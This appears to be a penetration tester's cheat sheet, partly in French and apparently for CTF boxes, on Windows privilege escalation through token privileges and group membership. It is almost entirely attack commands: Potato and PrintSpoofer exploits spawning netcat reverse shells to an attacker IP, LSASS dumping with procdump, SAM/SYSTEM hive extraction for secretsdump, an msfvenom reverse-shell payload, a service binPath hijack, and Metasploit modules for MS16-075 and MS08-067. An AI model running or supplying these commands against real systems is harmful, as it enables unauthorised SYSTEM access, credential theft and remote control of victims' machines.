## Windows User Privileges

### SeImpersonate/SeAssignPrimaryToken
> Allows impersonation of tokens - can be exploited with Potato attacks

```powershell
# Check if you have the privilege
whoami /priv

# For Windows Server 2016 & below
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe attacker-ip 4444 -e cmd.exe" -t *

# For Windows Server 2019 & Windows 10 (1809+)
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe attacker-ip 4444 -e cmd"
c:\tools\RoguePotato.exe -r attacker-ip -e "c:\tools\nc.exe attacker-ip 4444 -e cmd.exe" -l 9999
```

### SeDebugPrivilege
> Allows attaching to and debugging processes - can dump LSASS or inject into processes

```powershell
# Enable the privilege if disabled
Import-Module .\Enable-Privilege.ps1
Enable-Privilege -Name "SeDebugPrivilege"

# Dump LSASS for credentials
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# RCE as SYSTEM
$system_pid = Get-Process winlogon | Select -ExpandProperty Id
[MyProcess]::CreateProcessFromParent($system_pid,"cmd.exe","")
```

### SeTakeOwnershipPrivilege
> Allows to take ownership of any securable object

```powershell
# Enable the privilege
Enable-Privilege -Name "SeTakeOwnershipPrivilege"

# Take ownership of a file
takeown /f "C:\path\to\file.txt"

# Modify permissions to gain full access
icacls "C:\path\to\file.txt" /grant username:F
```

### SeBackupPrivilege
> exfiltrate and dump hashes from hives
```powershell
# Save Hives
reg save hklm\sam C:\temp\sam.hive
reg save hklm\security C:\temp\security.hive
reg save hklm\system C:\temp\system.hive

# dump hashes
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```
### SeRestorePrivilege
> exfiltrate and dump hashes from hives

```powershell
# Nice lil script
https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.51 LPORT=80 -f exe -o reverse.exe
./SeRestoreAbuse.exe <absolute path of reverse.exe>
```

## Techniques d'élévation de privilèges Windows dans des Box
### Exploitation des groupes de sécurité
Exemple (Return):
```bash
# Vérifier les appartenances aux groupes
whoami /all

# Exploitation du groupe Server Operators
sc.exe config <SERVICE> binPath="C:\path\to\nc.exe -e cmd.exe <IP> <PORT>"
sc.exe stop <SERVICE>
sc.exe start <SERVICE>
```
### Exploitation des droits SeImpersonate
Exemple (Jeeves):
```bash
# Utiliser Metasploit pour l'exploitation
use exploit/windows/local/ms16_075_reflection
set SESSION <SESSION_ID>
set LHOST <IP>
set LPORT <PORT>
exploit

# Utiliser Incognito pour l'usurpation de jetons
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```
### Exploitation des vulnérabilités connues
Exemple (Legacy):
```bash
# Exploitation de MS08-067
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP>
set LHOST <IP>
exploit
```
